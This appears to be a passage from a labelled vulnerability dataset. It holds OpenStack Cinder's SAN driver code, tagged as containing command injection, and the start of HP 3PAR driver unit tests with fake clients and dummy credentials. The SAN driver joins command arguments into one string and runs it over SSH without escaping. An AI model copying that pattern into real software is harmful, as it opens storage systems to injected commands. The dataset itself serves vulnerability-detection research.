    """"""Base class for SAN-style storage volumes

    A SAN-style storage value is 'different' because the volume controller
    probably won't run on it, so we need to access is over SSH or another
    remote protocol.
    """"""

    def __init__(self, *args, **kwargs):
        execute = kwargs.pop('execute', self.san_execute)
        super(SanDriver, self).__init__(execute=execute,
                                        *args, **kwargs)
        self.configuration.append_config_values(san_opts)
        self.run_local = self.configuration.san_is_local
        self.sshpool = None

    def san_execute(self, *cmd, **kwargs):
        if self.run_local:
            return utils.execute(*cmd, **kwargs)
        else:
            check_exit_code = kwargs.pop('check_exit_code', None)
            command = ' '.join(cmd)
            return self._run_ssh(command, check_exit_code)

    def _run_ssh(self, command, check_exit_code=True, attempts=1):
        if not self.sshpool:
            password = self.configuration.san_password
            privatekey = self.configuration.san_private_key
            min_size = self.configuration.ssh_min_pool_conn
            max_size = self.configuration.ssh_max_pool_conn
            self.sshpool = utils.SSHPool(self.configuration.san_ip,
                                         self.configuration.san_ssh_port,
                                         self.configuration.ssh_conn_timeout,
                                         self.configuration.san_login,
                                         password=password,
                                         privatekey=privatekey,
                                         min_size=min_size,
                                         max_size=max_size)
        last_exception = None
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        return utils.ssh_execute(
                            ssh,
                            command,
                            check_exit_code=check_exit_code)
                    except Exception as e:
                        LOG.error(e)
                        last_exception = e
                        greenthread.sleep(random.randint(20, 500) / 100.0)
                try:
                    raise exception.ProcessExecutionError(
                        exit_code=last_exception.exit_code,
                        stdout=last_exception.stdout,
                        stderr=last_exception.stderr,
                        cmd=last_exception.cmd)
                except AttributeError:
                    raise exception.ProcessExecutionError(
                        exit_code=-1,
                        stdout="""",
                        stderr=""Error running SSH command"",
                        cmd=command)

        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_(""Error running SSH command: %s"") % command)

    def ensure_export(self, context, volume):
        """"""Synchronously recreates an export for a logical volume.""""""
        pass

    def create_export(self, context, volume):
        """"""Exports the volume.""""""
        pass

    def remove_export(self, context, volume):
        """"""Removes an export for a logical volume.""""""
        pass

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        if not self.run_local:
            if not (self.configuration.san_password or
                    self.configuration.san_private_key):
                raise exception.InvalidInput(
                    reason=_('Specify san_password or san_private_key'))

        # The san_ip must always be set, because we use it for the target
        if not self.configuration.san_ip:
            raise exception.InvalidInput(reason=_(""san_ip must be set""))


class SanISCSIDriver(SanDriver, driver.ISCSIDriver):
    def __init__(self, *args, **kwargs):
        super(SanISCSIDriver, self).__init__(*args, **kwargs)

    def _build_iscsi_target_name(self, volume):
        return ""%s%s"" % (self.configuration.iscsi_target_prefix,
                         volume['name'])
/n/n/n",1,command_injection
6,64,c55589b131828f3a595903f6796cb2d0babb772f,"cinder/tests/test_hp3par.py/n/n#!/usr/bin/env python
# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
Unit tests for OpenStack Cinder volume drivers
""""""
import ast
import mox
import shutil
import tempfile

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import test
from cinder.volume import configuration as conf
from cinder.volume.drivers.san.hp import hp_3par_fc as hpfcdriver
from cinder.volume.drivers.san.hp import hp_3par_iscsi as hpdriver

LOG = logging.getLogger(__name__)

HP3PAR_DOMAIN = 'OpenStack',
HP3PAR_CPG = 'OpenStackCPG',
HP3PAR_CPG_SNAP = 'OpenStackCPGSnap'
CLI_CR = '\r\n'


class FakeHP3ParClient(object):

    api_url = None
    debug = False

    volumes = []
    hosts = []
    vluns = []
    cpgs = [
        {'SAGrowth': {'LDLayout': {'diskPatterns': [{'diskType': 2}]},
                      'incrementMiB': 8192},
         'SAUsage': {'rawTotalMiB': 24576,
                     'rawUsedMiB': 768,
                     'totalMiB': 8192,
                     'usedMiB': 256},
         'SDGrowth': {'LDLayout': {'RAIDType': 4,
                      'diskPatterns': [{'diskType': 2}]},
                      'incrementMiB': 32768},
         'SDUsage': {'rawTotalMiB': 49152,
                     'rawUsedMiB': 1023,
                     'totalMiB': 36864,
                     'usedMiB': 768},
         'UsrUsage': {'rawTotalMiB': 57344,
                      'rawUsedMiB': 43349,
                      'totalMiB': 43008,
                      'usedMiB': 32512},
         'additionalStates': [],
         'degradedStates': [],
         'domain': HP3PAR_DOMAIN,
         'failedStates': [],
         'id': 5,
         'name': HP3PAR_CPG,
         'numFPVVs': 2,
         'numTPVVs': 0,
         'state': 1,
         'uuid': '29c214aa-62b9-41c8-b198-543f6cf24edf'}]

    def __init__(self, api_url):
        self.api_url = api_url
        self.volumes = []
        self.hosts = []
        self.vluns = []

    def debug_rest(self, flag):
        self.debug = flag

    def login(self, username, password, optional=None):
        return None

    def logout(self):
        return None

    def getVolumes(self):
        return self.volumes

    def getVolume(self, name):
        if self.volumes:
            for volume in self.volumes:
                if volume['name'] == name:
                    return volume

        msg = {'code': 'NON_EXISTENT_HOST',
               'desc': ""VOLUME '%s' was not found"" % name}
        raise hpexceptions.HTTPNotFound(msg)

    def createVolume(self, name, cpgName, sizeMiB, optional=None):
        new_vol = {'additionalStates': [],
                   'adminSpace': {'freeMiB': 0,
                                  'rawReservedMiB': 384,
                                  'reservedMiB': 128,
                                  'usedMiB': 128},
                   'baseId': 115,
                   'comment': optional['comment'],
                   'copyType': 1,
                   'creationTime8601': '2012-10-22T16:37:57-07:00',
                   'creationTimeSec': 1350949077,
                   'degradedStates': [],
                   'domain': HP3PAR_DOMAIN,
                   'failedStates': [],
                   'id': 115,
                   'name': name,
                   'policies': {'caching': True,
                                'oneHost': False,
                                'staleSS': True,
                                'system': False,
                                'zeroDetect': False},
                   'provisioningType': 1,
                   'readOnly': False,
                   'sizeMiB': sizeMiB,
                   'snapCPG': optional['snapCPG'],
                   'snapshotSpace': {'freeMiB': 0,
                                     'rawReservedMiB': 683,
                                     'reservedMiB': 512,
                                     'usedMiB': 512},
                   'ssSpcAllocLimitPct': 0,
                   'ssSpcAllocWarningPct': 0,
                   'state': 1,
                   'userCPG': cpgName,
                   'userSpace': {'freeMiB': 0,
                                 'rawReservedMiB': 41984,
                                 'reservedMiB': 31488,
                                 'usedMiB': 31488},
                   'usrSpcAllocLimitPct': 0,
                   'usrSpcAllocWarningPct': 0,
                   'uuid': '1e7daee4-49f4-4d07-9ab8-2b6a4319e243',
                   'wwn': '50002AC00073383D'}
        self.volumes.append(new_vol)
        return None

    def deleteVolume(self, name):
        volume = self.getVolume(name)
        self.volumes.remove(volume)

    def createSnapshot(self, name, copyOfName, optional=None):
        new_snap = {'additionalStates': [],
                    'adminSpace': {'freeMiB': 0,
                                   'rawReservedMiB': 0,
                                   'reservedMiB': 0,
                                   'usedMiB': 0},
                    'baseId': 342,
                    'comment': optional['comment'],
                    'copyOf': copyOfName,
                    'copyType': 3,
                    'creationTime8601': '2012-11-09T15:13:28-08:00',
                    'creationTimeSec': 1352502808,
                    'degradedStates': [],
                    'domain': HP3PAR_DOMAIN,
                    'expirationTime8601': '2012-11-09T17:13:28-08:00',
                    'expirationTimeSec': 1352510008,
                    'failedStates': [],
                    'id': 343,
                    'name': name,
                    'parentId': 342,
                    'policies': {'caching': True,
                                 'oneHost': False,
                                 'staleSS': True,
                                 'system': False,
                                 'zeroDetect': False},
                    'provisioningType': 3,
                    'readOnly': True,
                    'retentionTime8601': '2012-11-09T16:13:27-08:00',
                    'retentionTimeSec': 1352506407,
                    'sizeMiB': 256,
                    'snapCPG': HP3PAR_CPG_SNAP,
                    'snapshotSpace': {'freeMiB': 0,
                                      'rawReservedMiB': 0,
                                      'reservedMiB': 0,
                                      'usedMiB': 0},
                    'ssSpcAllocLimitPct': 0,
                    'ssSpcAllocWarningPct': 0,
                    'state': 1,
                    'userCPG': HP3PAR_CPG,
                    'userSpace': {'freeMiB': 0,
                                  'rawReservedMiB': 0,
                                  'reservedMiB': 0,
                                  'usedMiB': 0},
                    'usrSpcAllocLimitPct': 0,
                    'usrSpcAllocWarningPct': 0,
                    'uuid': 'd7a40b8f-2511-46a8-9e75-06383c826d19',
                    'wwn': '50002AC00157383D'}
        self.volumes.append(new_snap)
        return None

    def deleteSnapshot(self, name):
        volume = self.getVolume(name)
        self.volumes.remove(volume)

    def createCPG(self, name, optional=None):
        cpg = {'SAGrowth': {'LDLayout': {'diskPatterns': [{'diskType': 2}]},
                            'incrementMiB': 8192},
               'SAUsage': {'rawTotalMiB': 24576,
                           'rawUsedMiB': 768,
                           'totalMiB': 8192,
                           'usedMiB': 256},
               'SDGrowth': {'LDLayout': {'RAIDType': 4,
                            'diskPatterns': [{'diskType': 2}]},
                            'incrementMiB': 32768},
               'SDUsage': {'rawTotalMiB': 49152,
                           'rawUsedMiB': 1023,
                           'totalMiB': 36864,
                           'usedMiB': 768},
               'UsrUsage': {'rawTotalMiB': 57344,
                            'rawUsedMiB': 43349,
                            'totalMiB': 43008,
                            'usedMiB': 32512},
               'additionalStates': [],
               'degradedStates': [],
               'domain': HP3PAR_DOMAIN,
               'failedStates': [],
               'id': 1,
               'name': name,
               'numFPVVs': 2,
               'numTPVVs': 0,
               'state': 1,
               'uuid': '29c214aa-62b9-41c8-b198-000000000000'}

        new_cpg = cpg.copy()
        new_cpg.update(optional)
        self.cpgs.append(new_cpg)

    def getCPGs(self):
        return self.cpgs

    def getCPG(self, name):
        if self.cpgs:
            for cpg in self.cpgs:
                if cpg['name'] == name:
                    return cpg

        msg = {'code': 'NON_EXISTENT_HOST',
               'desc': ""CPG '%s' was not found"" % name}
        raise hpexceptions.HTTPNotFound(msg)

    def deleteCPG(self, name):
        cpg = self.getCPG(name)
        self.cpgs.remove(cpg)

    def createVLUN(self, volumeName, lun, hostname=None,
                   portPos=None, noVcn=None,
                   overrideLowerPriority=None):

        vlun = {'active': False,
                'failedPathInterval': 0,
                'failedPathPol': 1,
                'hostname': hostname,
                'lun': lun,
                'multipathing': 1,
                'portPos': portPos,
                'type': 4,
                'volumeName': volumeName,
                'volumeWWN': '50002AC00077383D'}
        self.vluns.append(vlun)
        return None

    def deleteVLUN(self, name, lunID, hostname=None, port=None):
        vlun = self.getVLUN(name)
        self.vluns.remove(vlun)

    def getVLUNs(self):
        return self.vluns

    def getVLUN(self, volumeName):
        for vlun in self.vluns:
            if vlun['volumeName'] == volumeName:
                return vlun

        msg = {'code': 'NON_EXISTENT_HOST',
               'desc': ""VLUN '%s' was not found"" % volumeName}
        raise hpexceptions.HTTPNotFound(msg)


class HP3PARBaseDriver():

    VOLUME_ID = ""d03338a9-9115-48a3-8dfc-35cdfcdc15a7""
    CLONE_ID = ""d03338a9-9115-48a3-8dfc-000000000000""
    VOLUME_NAME = ""volume-d03338a9-9115-48a3-8dfc-35cdfcdc15a7""
    SNAPSHOT_ID = ""2f823bdc-e36e-4dc8-bd15-de1c7a28ff31""
    SNAPSHOT_NAME = ""snapshot-2f823bdc-e36e-4dc8-bd15-de1c7a28ff31""
    VOLUME_3PAR_NAME = ""osv-0DM4qZEVSKON-DXN-NwVpw""
    SNAPSHOT_3PAR_NAME = ""oss-L4I73ONuTci9Fd4ceij-MQ""
    FAKE_HOST = ""fakehost""
    USER_ID = '2689d9a913974c008b1d859013f23607'
    PROJECT_ID = 'fac88235b9d64685a3530f73e490348f'
    VOLUME_ID_SNAP = '761fc5e5-5191-4ec7-aeba-33e36de44156'
    FAKE_DESC = 'test description name'
    FAKE_FC_PORTS = ['0987654321234', '123456789000987']
    QOS = {'qos:maxIOPS': '1000', 'qos:maxBWS': '50'}
    VVS_NAME = ""myvvs""
    FAKE_ISCSI_PORTS = {'1.1.1.2': {'nsp': '8:1:1',
                                    'iqn': ('iqn.2000-05.com.3pardata:'
                                            '21810002ac00383d'),
                                    'ip_port': '3262'}}

    volume = {'name': VOLUME_NAME,
              'id': VOLUME_ID,
              'display_name': 'Foo Volume',
              'size': 2,
              'host': FAKE_HOST,
              'volume_type': None,
              'volume_type_id': None}

    volume_qos = {'name': VOLUME_NAME,
                  'id': VOLUME_ID,
                  'display_name': 'Foo Volume',
                  'size': 2,
                  'host': FAKE_HOST,
                  'volume_type': None,
                  'volume_type_id': 'gold'}

    snapshot = {'name': SNAPSHOT_NAME,
                'id': SNAPSHOT_ID,
                'user_id': USER_ID,
                'project_id': PROJECT_ID,
                'volume_id': VOLUME_ID_SNAP,
                'volume_name': VOLUME_NAME,
                'status': 'creating',
                'progress': '0%',
                'volume_size': 2,
                'display_name': 'fakesnap',
                'display_description': FAKE_DESC}

    connector = {'ip': '10.0.0.2',
                 'initiator': 'iqn.1993-08.org.debian:01:222',
                 'wwpns': [""123456789012345"", ""123456789054321""],
                 'wwnns': [""223456789012345"", ""223456789054321""],
                 'host': 'fakehost'}

    volume_type = {'name': 'gold',
                   'deleted': False,
                   'updated_at': None,
                   'extra_specs': {'qos:maxBWS': '50',
                                   'qos:maxIOPS': '1000'},
                   'deleted_at': None,
                   'id': 'gold'}

    def setup_configuration(self):
        configuration = mox.MockObject(conf.Configuration)
        configuration.hp3par_debug = False
        configuration.hp3par_username = 'testUser'
        configuration.hp3par_password = 'testPassword'
        configuration.hp3par_api_url = 'https://1.1.1.1/api/v1'
        configuration.hp3par_domain = HP3PAR_DOMAIN
        configuration.hp3par_cpg = HP3PAR_CPG
        configuration.hp3par_cpg_snap = HP3PAR_CPG_SNAP
        configuration.iscsi_ip_address = '1.1.1.2'
        configuration.iscsi_port = '1234'
        configuration.san_ip = '2.2.2.2'
        configuration.san_login = 'test'
        configuration.san_password = 'test'
        configuration.hp3par_snapshot_expiration = """"
        configuration.hp3par_snapshot_retention = """"
        configuration.hp3par_iscsi_ips = []
        return configuration

    def setup_fakes(self):
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_client"",
                       self.fake_create_client)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_set_connections"",
                       self.fake_set_connections)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_get_3par_host"",
                       self.fake_get_3par_host)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_delete_3par_host"",
                       self.fake_delete_3par_host)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_3par_vlun"",
                       self.fake_create_3par_vlun)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_ports"",
                       self.fake_get_ports)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)

    def clear_mox(self):
        self.mox.ResetAll()
        self.stubs.UnsetAll()

    def fake_create_client(self):
        return FakeHP3ParClient(self.driver.configuration.hp3par_api_url)

    def fake_get_cpg(self, volume, allowSnap=False):
        return HP3PAR_CPG

    def fake_set_connections(self):
        return

    def fake_get_domain(self, cpg):
        return HP3PAR_DOMAIN

    def fake_extend_volume(self, volume, new_size):
        vol = self.driver.common.client.getVolume(volume['name'])
        old_size = vol['sizeMiB']
        option = {'comment': vol['comment'], 'snapCPG': vol['snapCPG']}
        self.driver.common.client.deleteVolume(volume['name'])
        self.driver.common.client.createVolume(vol['name'],
                                               vol['userCPG'],
                                               new_size, option)

    def fake_get_3par_host(self, hostname):
        if hostname not in self._hosts:
            msg = {'code': 'NON_EXISTENT_HOST',
                   'desc': ""HOST '%s' was not found"" % hostname}
            raise hpexceptions.HTTPNotFound(msg)
        else:
            return self._hosts[hostname]

    def fake_delete_3par_host(self, hostname):
        if hostname not in self._hosts:
            msg = {'code': 'NON_EXISTENT_HOST',
                   'desc': ""HOST '%s' was not found"" % hostname}
            raise hpexceptions.HTTPNotFound(msg)
        else:
            del self._hosts[hostname]

    def fake_create_3par_vlun(self, volume, hostname):
        self.driver.common.client.createVLUN(volume, 19, hostname)

    def fake_get_ports(self):
        return {'FC': self.FAKE_FC_PORTS, 'iSCSI': self.FAKE_ISCSI_PORTS}

    def fake_get_volume_type(self, type_id):
        return self.volume_type

    def fake_get_qos_by_volume_type(self, volume_type):
        return self.QOS

    def fake_add_volume_to_volume_set(self, volume, volume_name,
                                      cpg, vvs_name, qos):
        return volume

    def fake_copy_volume(self, src_name, dest_name, cpg=None,
                         snap_cpg=None, tpvv=True):
        pass

    def fake_get_volume_stats(self, vol_name):
        return ""normal""

    def fake_get_volume_settings_from_type(self, volume):
        return {'cpg': HP3PAR_CPG,
                'snap_cpg': HP3PAR_CPG_SNAP,
                'vvs_name': self.VVS_NAME,
                'qos': self.QOS,
                'tpvv': True,
                'volume_type': self.volume_type}

    def fake_get_volume_settings_from_type_noqos(self, volume):
        return {'cpg': HP3PAR_CPG,
                'snap_cpg': HP3PAR_CPG_SNAP,
                'vvs_name': None,
                'qos': None,
                'tpvv': True,
                'volume_type': None}

    def test_create_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type_noqos)
        self.driver.create_volume(self.volume)
        volume = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)
        self.assertEqual(volume['name'], self.VOLUME_3PAR_NAME)

    def test_create_volume_qos(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""_add_volume_to_volume_set"",
                       self.fake_add_volume_to_volume_set)
        self.driver.create_volume(self.volume_qos)
        volume = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)

        self.assertEqual(volume['name'], self.VOLUME_3PAR_NAME)
        self.assertNotIn(self.QOS, dict(ast.literal_eval(volume['comment'])))

    def test_delete_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.driver.delete_volume(self.volume)
        self.assertRaises(hpexceptions.HTTPNotFound,
                          self.driver.common.client.getVolume,
                          self.VOLUME_ID)

    def test_create_cloned_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_copy_volume"",
                       self.fake_copy_volume)
        volume = {'name': HP3PARBaseDriver.VOLUME_NAME,
                  'id': HP3PARBaseDriver.CLONE_ID,
                  'display_name': 'Foo Volume',
                  'size': 2,
                  'host': HP3PARBaseDriver.FAKE_HOST,
                  'source_volid': HP3PARBaseDriver.VOLUME_ID}
        src_vref = {}
        model_update = self.driver.create_cloned_volume(volume, src_vref)
        self.assertTrue(model_update is not None)

    def test_create_snapshot(self):
        self.flags(lock_path=self.tempdir)
        self.driver.create_snapshot(self.snapshot)

        # check to see if the snapshot was created
        snap_vol = self.driver.common.client.getVolume(self.SNAPSHOT_3PAR_NAME)
        self.assertEqual(snap_vol['name'], self.SNAPSHOT_3PAR_NAME)

    def test_delete_snapshot(self):
        self.flags(lock_path=self.tempdir)

        self.driver.create_snapshot(self.snapshot)
        #make sure it exists first
        vol = self.driver.common.client.getVolume(self.SNAPSHOT_3PAR_NAME)
        self.assertEqual(vol['name'], self.SNAPSHOT_3PAR_NAME)
        self.driver.delete_snapshot(self.snapshot)

        # the snapshot should be deleted now
        self.assertRaises(hpexceptions.HTTPNotFound,
                          self.driver.common.client.getVolume,
                          self.SNAPSHOT_3PAR_NAME)

    def test_create_volume_from_snapshot(self):
        self.flags(lock_path=self.tempdir)
        self.driver.create_volume_from_snapshot(self.volume, self.snapshot)

        snap_vol = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)
        self.assertEqual(snap_vol['name'], self.VOLUME_3PAR_NAME)

        volume = self.volume.copy()
        volume['size'] = 1
        self.assertRaises(exception.InvalidInput,
                          self.driver.create_volume_from_snapshot,
                          volume, self.snapshot)

    def test_create_volume_from_snapshot_qos(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_get_volume_type"",
                       self.fake_get_volume_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""_get_qos_by_volume_type"",
                       self.fake_get_qos_by_volume_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""_add_volume_to_volume_set"",
                       self.fake_add_volume_to_volume_set)
        self.driver.create_volume_from_snapshot(self.volume_qos, self.snapshot)
        snap_vol = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)
        self.assertEqual(snap_vol['name'], self.VOLUME_3PAR_NAME)
        self.assertNotIn(self.QOS, dict(ast.literal_eval(snap_vol['comment'])))

        volume = self.volume.copy()
        volume['size'] = 1
        self.assertRaises(exception.InvalidInput,
                          self.driver.create_volume_from_snapshot,
                          volume, self.snapshot)

    def test_terminate_connection(self):
        self.flags(lock_path=self.tempdir)
        #setup the connections
        self.driver.initialize_connection(self.volume, self.connector)
        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)
        self.assertEqual(vlun['volumeName'], self.VOLUME_3PAR_NAME)
        self.driver.terminate_connection(self.volume, self.connector,
                                         force=True)
        # vlun should be gone.
        self.assertRaises(hpexceptions.HTTPNotFound,
                          self.driver.common.client.getVLUN,
                          self.VOLUME_3PAR_NAME)

    def test_extend_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.UnsetAll()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""extend_volume"",
                       self.fake_extend_volume)
        option = {'comment': '', 'snapCPG': HP3PAR_CPG_SNAP}
        self.driver.common.client.createVolume(self.volume['name'],
                                               HP3PAR_CPG,
                                               self.volume['size'],
                                               option)
        old_size = self.volume['size']
        volume = self.driver.common.client.getVolume(self.volume['name'])
        self.driver.extend_volume(volume, str(old_size + 1))
        vol = self.driver.common.client.getVolume(self.volume['name'])
        self.assertEqual(vol['sizeMiB'], str(old_size + 1))


class TestHP3PARFCDriver(HP3PARBaseDriver, test.TestCase):

    _hosts = {}

    def setUp(self):
        self.tempdir = tempfile.mkdtemp()
        super(TestHP3PARFCDriver, self).setUp()
        self.setup_driver(self.setup_configuration())
        self.setup_fakes()

    def setup_fakes(self):
        super(TestHP3PARFCDriver, self).setup_fakes()
        self.stubs.Set(hpfcdriver.HP3PARFCDriver,
                       ""_create_3par_fibrechan_host"",
                       self.fake_create_3par_fibrechan_host)

    def tearDown(self):
        shutil.rmtree(self.tempdir)
        super(TestHP3PARFCDriver, self).tearDown()

    def setup_driver(self, configuration):
        self.driver = hpfcdriver.HP3PARFCDriver(configuration=configuration)

        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_client"",
                       self.fake_create_client)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_set_connections"",
                       self.fake_set_connections)
        self.driver.do_setup(None)

    def fake_create_3par_fibrechan_host(self, hostname, wwn,
                                        domain, persona_id):
        host = {'FCPaths': [{'driverVersion': None,
                             'firmwareVersion': None,
                             'hostSpeed': 0,
                             'model': None,
                             'portPos': {'cardPort': 1, 'node': 1,
                                         'slot': 2},
                             'vendor': None,
                             'wwn': wwn[0]},
                            {'driverVersion': None,
                             'firmwareVersion': None,
                             'hostSpeed': 0,
                             'model': None,
                             'portPos': {'cardPort': 1, 'node': 0,
                                         'slot': 2},
                             'vendor': None,
                             'wwn': wwn[1]}],
                'descriptors': None,
                'domain': domain,
                'iSCSIPaths': [],
                'id': 11,
                'name': hostname}
        self._hosts[hostname] = host
        self.properties = {'data':
                          {'target_discovered': True,
                           'target_lun': 186,
                           'target_portal': '1.1.1.2:1234'},
                           'driver_volume_type': 'fibre_channel'}
        return hostname

    def test_initialize_connection(self):
        self.flags(lock_path=self.tempdir)
        result = self.driver.initialize_connection(self.volume, self.connector)
        self.assertEqual(result['driver_volume_type'], 'fibre_channel')

        # we should have a host and a vlun now.
        host = self.fake_get_3par_host(self.FAKE_HOST)
        self.assertEquals(self.FAKE_HOST, host['name'])
        self.assertEquals(HP3PAR_DOMAIN, host['domain'])
        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)

        self.assertEquals(self.VOLUME_3PAR_NAME, vlun['volumeName'])
        self.assertEquals(self.FAKE_HOST, vlun['hostname'])

    def test_get_volume_stats(self):
        self.flags(lock_path=self.tempdir)

        def fake_safe_get(*args):
            return ""HP3PARFCDriver""

        self.stubs.Set(self.driver.configuration, 'safe_get', fake_safe_get)
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'FC')
        self.assertEquals(stats['total_capacity_gb'], 'infinite')
        self.assertEquals(stats['free_capacity_gb'], 'infinite')

        #modify the CPG to have a limit
        old_cpg = self.driver.common.client.getCPG(HP3PAR_CPG)
        options = {'SDGrowth': {'limitMiB': 8192}}
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, options)

        const = 0.0009765625
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'FC')
        total_capacity_gb = 8192 * const
        self.assertEquals(stats['total_capacity_gb'], total_capacity_gb)
        free_capacity_gb = int((8192 - old_cpg['UsrUsage']['usedMiB']) * const)
        self.assertEquals(stats['free_capacity_gb'], free_capacity_gb)
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, {})

    def test_create_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-persona', '1', '-domain',
                            ('OpenStack',), 'fakehost', '123456789012345',
                            '123456789054321'])
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])

        _run_ssh(show_host_cmd, False).AndReturn([pack(FC_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)

    def test_create_invalid_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-persona', '1', '-domain',
                            ('OpenStack',), 'fakehost', '123456789012345',
                            '123456789054321'])
        create_host_ret = pack(CLI_CR +
                               'already used by host fakehost.foo (19)')
        _run_ssh(create_host_cmd, False).AndReturn([create_host_ret, ''])

        show_3par_cmd = ['showhost', '-verbose', 'fakehost.foo']
        _run_ssh(show_3par_cmd, False).AndReturn([pack(FC_SHOWHOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)

        self.assertEquals(host['name'], 'fakehost.foo')

    def test_create_modify_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack(NO_FC_HOST_RET), ''])

        create_host_cmd = ['createhost', '-add', 'fakehost', '123456789012345',
                           '123456789054321']
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack(FC_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)


class TestHP3PARISCSIDriver(HP3PARBaseDriver, test.TestCase):

    TARGET_IQN = ""iqn.2000-05.com.3pardata:21810002ac00383d""

    _hosts = {}

    def setUp(self):
        self.tempdir = tempfile.mkdtemp()
        super(TestHP3PARISCSIDriver, self).setUp()
